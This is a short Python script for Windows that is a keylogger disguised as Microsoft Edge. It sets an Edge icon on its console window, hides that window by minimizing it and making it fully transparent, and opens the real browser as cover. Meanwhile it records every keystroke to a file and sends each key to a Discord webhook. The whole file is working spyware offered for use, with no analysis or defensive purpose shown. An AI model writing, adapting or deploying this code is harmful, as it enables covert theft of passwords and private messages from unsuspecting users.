import os
from pynput import keyboard
import ctypes
import win32gui
import win32con
from discordwebhook import Discord

GWL_EXSTYLE = -20
WS_EX_LAYERED = 0x00080000
LWA_ALPHA = 0x00000002
ICON_BIG = 1
ICON_SMALL = 0
WM_SETICON = 0x0080

custom_icon_path = "edgestart.ico"
hicon = ctypes.windll.user32.LoadImageW(None, custom_icon_path, ctypes.c_uint(1), 0, 0, ctypes.c_uint(0x00000010 | 0x00000020))
hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
win32gui.SetLayeredWindowAttributes(hwnd, 0, 128, win32con.LWA_ALPHA)

hond = ctypes.windll.kernel32.GetConsoleWindow()
ctypes.windll.user32.SendMessageW(hond, WM_SETICON, ICON_BIG, hicon)
ctypes.windll.user32.SendMessageW(hond, WM_SETICON, ICON_SMALL, hicon)

current_style = ctypes.windll.user32.GetWindowLongA(hwnd, GWL_EXSTYLE)
new_style = current_style | WS_EX_LAYERED
ctypes.windll.user32.SetWindowLongA(hwnd, GWL_EXSTYLE, new_style)

# Set the transparency level (0 is fully transparent, 255 is opaque)
transparency = 0  # Example: set transparency to 50%
ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, transparency, LWA_ALPHA)

os.system("start msedge")
discord = Discord(url="[-YOUR WEBHOOK URL-]")

def on_press(key):
    try:
        with open("report.txt", "a") as f:
            f.write('{0}\n'.format(key))
            discord.post(content='{0}\n'.format(key))
    except AttributeError:
        with open("report.txt", "a") as f:
            f.write('{0}\n'.format(key))
            discord.post(content='{0}\n'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
            listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)


listener.start()
